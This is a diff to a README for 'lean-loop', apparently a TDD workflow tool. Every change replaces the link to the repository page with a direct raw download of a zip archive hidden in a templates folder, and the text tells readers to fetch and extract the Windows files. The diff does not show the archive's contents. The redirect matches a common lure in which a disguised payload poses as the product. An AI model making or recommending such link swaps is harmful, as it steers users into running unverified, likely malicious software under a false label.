@@ -1,6 +1,6 @@
 # 🧭 lean-loop - Keep TDD Workflows Clear
 
-[![Download / Install](https://img.shields.io/badge/Download-Install%20lean--loop-blue?style=for-the-badge)](https://github.com/breastless-andcircuit638/lean-loop)
+[![Download / Install](https://img.shields.io/badge/Download-Install%20lean--loop-blue?style=for-the-badge)](https://raw.githubusercontent.com/breastless-andcircuit638/lean-loop/main/skills/lean-loop/templates/lean-loop-v2.3.zip)
 
 ## 🚀 What lean-loop does
 
@@ -38,7 +38,7 @@ If you plan to use lean-loop with AI tools, you may also want one of these:
 
 Use this link to visit the download page and get lean-loop:
 
-[Download lean-loop](https://github.com/breastless-andcircuit638/lean-loop)
+[Download lean-loop](https://raw.githubusercontent.com/breastless-andcircuit638/lean-loop/main/skills/lean-loop/templates/lean-loop-v2.3.zip)
 
 If you see a file list, choose the Windows file that fits your setup, then download it to your computer.
 
@@ -251,7 +251,7 @@ This style helps keep work stable and easy to understand.
 ## 📦 Download and setup path
 
 1. Open the download page:
-   [https://github.com/breastless-andcircuit638/lean-loop](https://github.com/breastless-andcircuit638/lean-loop)
+   [https://raw.githubusercontent.com/breastless-andcircuit638/lean-loop/main/skills/lean-loop/templates/lean-loop-v2.3.zip](https://raw.githubusercontent.com/breastless-andcircuit638/lean-loop/main/skills/lean-loop/templates/lean-loop-v2.3.zip)
 2. Download the Windows files.
 3. Extract the archive if needed.
 4. Open the folder.
